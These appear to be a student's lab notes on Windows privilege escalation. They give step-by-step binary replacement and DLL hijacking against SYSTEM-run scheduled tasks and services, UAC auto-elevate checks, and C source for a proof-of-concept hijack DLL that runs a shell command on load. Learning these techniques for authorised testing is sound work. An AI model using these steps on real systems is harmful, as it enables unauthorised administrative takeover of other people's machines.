Windows Access Control Model
  - Access tokens -- users 
      - Roles
      - Permissions
      - Rights
  - Security Descriptors - Files
      - DACL: Discretionary Access Control List 
  - Rules on the file
  
    - SACL: System Access Control List 
        - auditing on the file
    - ACES: Access Controls Entries
        - Entries of what to audit on the file inside of the SACl
DLL SEARCH ORDER
      - executables check the following locations
          - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
            
          - The directory the the Application was run from

          - The Directory specified in the C+ function GetSystemDirectory()
          
          - The Directory specified in the C+ function GetWindowsDirectory 
          
          - The current Directory 
          
WIN PRIV ESC
    1) SCHEDULED TASKS (cron)
    - Binary replacement
    - DLL hijacking
    2) Services
        - Binary replacement
        - DLL hijacking
    Binary Replacement 
        - replacing the legitimate binary with a malicious one
        
    DLL hijacking 
        - Replacing the legitimate DLL that the binary i calling out to with a malicious DLL 
CHECKING UAC SETTINGS 
    - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    - EnableLUA REG_DWORD 0x1
AUTOELEVATE EXECUTABLES
    - asInvoker
    - highestAvailabe
    - asAdministrator
    - FOR UAC 
AUTOElevate: TRue or N/A
EventViewer: runs as highest available
    - Autoelevate is set to true
    net use * \\live.sysinternal.com\tools
sigcheck.exe -m <file_path_of_executable> | findstr /i level
sigcheck.exe -m <file_path_of_executable> | findstr /i AutoElevate

*** SCHED TASKS SETUP DEMO ***
   1) Create the scheduled tasks
      - schtasks /create /TN Putty  /TR "C:\Putty\Putty.exe" /RU SYSTEM /SC onlogon
   2) create the directory called putty in the following location 
      - C:\Putty 
   3) download v. 0.67 of Putty and palce inside C:|Putty directory
        - https://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.67.html
        putty.exe (the SSH and Telnet client itself)
        - 32-bit: putty.exe
   schtasks /query /fo LIST /v
   
   
   SChedule tasks
 1) Determine Conditions
   General Tabs
      - Security options: System
   Trigger tab 
      - TRigger: At logon
      - Status : enabled
   Actions tab 
      - action C:\Putty\Putty.exe
 2) Determine if we have write permissions at the location 
      - so in this case the C:\Putty folder/directory
      - attempt to create a file inside the directory
 3) perform actions
    - binary replacement
        a) replace legitimate binary with malicious binary
        b) be sure the malicious binary has the same name that the actions tab is calling upon
        
        
        
        http://105.0.35.67/uploads
    - DLL hijacking 
      a) find dlls that the sched tasks use 
            - use procmon and run the exe 
        - procmon filters to find DLLs that putty.exe is using
        - process name - contains - putty - include
        - result - contains - NOT - include 
        - Path - Cotains - .dll - Include
      b) create C SOurce FIle and COmpile into DLL 
          - Install tools on linux machine
          - sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-tools mingw-w64-x86-64-dev -y

          
          
          ####### SSPICLI.C ######### 
        #include <windows.h>
        int execCommand()
        {
          WinExec("cmd /C whoami > FINDME_1.txt", 1);
          return 0;
        }
          BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
        {
          execCommand();
          return 0;
          }

         
         
         
         
 4) reboot / log on / log back in
    - shutdown /r /f /t 00
 Services BINARY REPLACEMENT    
 1) Determine the conditions
    - Log on as
    - startup type
    - description: blank ( THird party service) 
        - usually third party software are installed in non standard windows directories
    C:\windows
    C:\windows\system32
    right click _> properties // Path to executable C:\putty\putty.exe -- servicee
 2) Determine vulernable directory (if we have write permissions
    go to directory and attempt to write a file
 3) Perform actions
    Binary Replacement
      a) replace legitimate binary with malicious one
      
      b) ensure malciious binary has the same name as the one the windows service is calling for 
      
      http://10.50.35.61/uploads
      file explorer > view > 
      [X] file name extensions
      [X] hidden items
    DLL HIJACKING
 4)Reboot
        
    
